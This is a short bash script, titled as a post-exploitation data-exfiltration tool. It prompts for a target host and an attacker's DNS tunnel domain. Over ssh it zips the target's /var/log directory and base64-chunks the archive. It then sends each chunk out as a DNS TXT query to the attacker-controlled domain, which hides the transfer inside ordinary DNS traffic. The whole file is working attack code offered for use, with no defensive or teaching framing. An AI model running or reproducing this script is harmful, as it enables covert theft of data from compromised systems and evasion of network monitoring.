#!/usr/bin/env bash
# exfil.sh
# 12. Post-Exploit Data Exfil via DNS
# Zips logs, base64-chunks, and exfiltrates via DNS TXT queries.
# Usage: ./exfil.sh
# Requires: ssh, zip, dig

function detect_os() {
  case "$(uname -s)" in
    Linux*) echo "linux" ;;
    Darwin*) echo "darwin" ;;
    *) echo "unknown" ;;
  esac
}

function ensure_tool() {
  local t=$1
  if ! command -v "$t" &>/dev/null; then
    echo "[!] $t missing, please install manually."; exit 1
  fi
}

function get_credentials() {
  read -rp "Enter target (user@host): " TGT
  read -rp "Enter DNS tunnel domain: " DNSTUNNEL
}

ensure_tool ssh
ensure_tool zip
ensure_tool dig
get_credentials

# Archive logs on target
ssh ${TGT} "zip -r /tmp/exfil.zip /var/log"
# Chunk and exfiltrate
ssh ${TGT} "base64 /tmp/exfil.zip | fold -w50 > /tmp/chunks.txt"
while read -r chunk; do
  dig TXT +short "${chunk}.${DNSTUNNEL}"
  sleep 0.1
done < <(ssh ${TGT} "cat /tmp/chunks.txt")
